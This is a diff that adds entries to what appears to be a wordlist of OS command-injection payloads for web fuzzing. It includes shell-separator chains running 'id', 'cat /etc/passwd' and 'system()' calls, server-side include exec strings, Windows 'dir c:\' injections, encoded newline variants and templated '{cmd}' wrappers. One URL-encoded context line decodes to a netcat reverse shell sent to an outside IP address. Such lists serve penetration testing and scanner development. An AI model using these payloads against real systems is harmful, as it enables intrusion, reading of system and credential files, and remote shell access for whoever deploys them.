@@ -105,3 +105,149 @@ b'..%2F..%2F..%2Fbin/ls%20-al|'
 b'..%c0%af..%c0%af../bin/ls%20-al|'
 b'%31%3b%6c%73%20%2d%61%6c%3b'
 b'%31%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%2e%31%2e%31%2e%31%20%33%33'
++|+Dir+c:\
+$+|+Dir+c:\
+%26%26+|+dir c:\
+$%26%26dir c:\
+%0a+dir+c:\
++|+Dir+c:%255c
+$+|+Dir+c:%255c
+%26%26+|+dir c:%255c
+$%26%26dir+c:%255c
+%0a+dir+c:%255c
++|+Dir+c:%2f
+$+|+Dir+c:%2f
+%26%26+|+dir c:%2f
+$%26%26dir+c:%2f
+%0a+dir+c:%2f
++dir+c:\+|
++|+dir+c:\+|
++|+dir+c:%2f+|
+dir+c:\
+||+dir|c:\
+
+<!--#exec cmd="/usr/bin/id"-->
+<!--#exec cmd="id"-->
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+$;/usr/bin/id
+{cmd}
+;{cmd}
+;{cmd};
+^{cmd}
+|{cmd}
+<{cmd}
+<{cmd};
+<{cmd}\n
+<{cmd}%0D
+<{cmd}%0A
+&{cmd}
+&{cmd}&
+&&{cmd}
+&&{cmd}&&
+%0D{cmd}
+%0D{cmd}%0D
+%0A{cmd}
+%0A{cmd}%0A
+\n{cmd}
+\n{cmd}\n
+'{cmd}'
+`{cmd}`
+;{cmd}|
+;{cmd}/n
+|{cmd};
+a);{cmd}
+a;{cmd}
+a);{cmd}
+a;{cmd};
+a);{cmd}|
+FAIL||{cmd}
+CMD=$'{cmd}';$CMD
+;CMD=$'{cmd}';$CMD
+^CMD=$'{cmd}';$CMD
+|CMD=$'{cmd}';$CMD
+&CMD=$'{cmd}';$CMD
+&&CMD=$'{cmd}';$CMD
+%0DCMD=$'{cmd}';$CMD
+FAIL||CMD=$'{cmd}';$CMD
+CMD=$\'{cmd}\';$CMD
+;CMD=$\'{cmd}\';$CMD
+^CMD=$\'{cmd}\';$CMD
+|CMD=$\'{cmd}\';$CMD
+&CMD=$\'{cmd}\';$CMD
+&&CMD=$\'{cmd}\';$CMD
+%0DCMD=$\'{cmd}\';$CMD
+FAIL||CMD=$\'{cmd}\';$CMD
+CMD=$"{cmd}";$CMD
+;CMD=$"{cmd}";$CMD
+^CMD=$"{cmd}";$CMD
+|CMD=$"{cmd}";$CMD
+&CMD=$"{cmd}";$CMD
+&&CMD=$"{cmd}";$CMD
+%0DCMD=$"{cmd}";$CMD
+FAIL||CMD=$"{cmd}";$CMD
+<!--#exec cmd="{cmd}"-->
+;system('{cmd}')
